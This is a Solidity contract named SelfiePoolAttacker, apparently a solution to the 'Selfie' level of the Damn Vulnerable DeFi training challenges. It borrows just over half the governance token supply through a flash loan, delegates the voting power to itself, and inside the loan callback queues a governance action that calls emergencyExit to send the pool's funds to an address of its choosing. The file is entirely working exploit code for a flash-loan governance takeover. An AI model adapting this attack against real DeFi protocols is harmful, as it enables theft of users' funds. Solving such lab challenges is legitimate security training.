// SPDX-License-Identifier: UNLICENSED
pragma solidity =0.8.25;

import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import {DamnValuableVotes} from "../DamnValuableVotes.sol";

interface ISimpleGovernance {
    function queueAction(address target, uint128 value, bytes calldata data) external returns (uint256 actionId);
}

interface ISelfiePool {
    function token() external view returns (DamnValuableVotes);
    function maxFlashLoan(address _token) external view returns (uint256);
    function flashLoan(
        IERC3156FlashBorrower _receiver,
        address _token,
        uint256 _amount,
        bytes calldata _data
    ) external returns (bool);
}

contract SelfiePoolAttacker is IERC3156FlashBorrower {
    ISimpleGovernance governance;
    ISelfiePool pool;
    DamnValuableVotes token;

    constructor(address _governance, address _pool) {
        governance = ISimpleGovernance(_governance);
        pool = ISelfiePool(_pool);
        token = pool.token();
    }

    function flashLoanAttack(address _fundsTarget) public {
        uint256 loanAmount = (token.totalSupply() >> 1) + 1;  // total supply / 2 + 1

        token.delegate(address(this));  // Delegate to itself to gain votes on token transfer
        token.approve(address(pool), loanAmount);   // for repayment of flash loan

        bytes memory data = abi.encodeWithSignature("emergencyExit(address)", _fundsTarget);
        pool.flashLoan(this, address(token), loanAmount, data);
    }

    function onFlashLoan(
        address,
        address,
        uint256,
        uint256,
        bytes calldata data
    ) external returns (bytes32) {
        require(msg.sender == address(pool));
        governance.queueAction(address(pool), 0, data);
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}
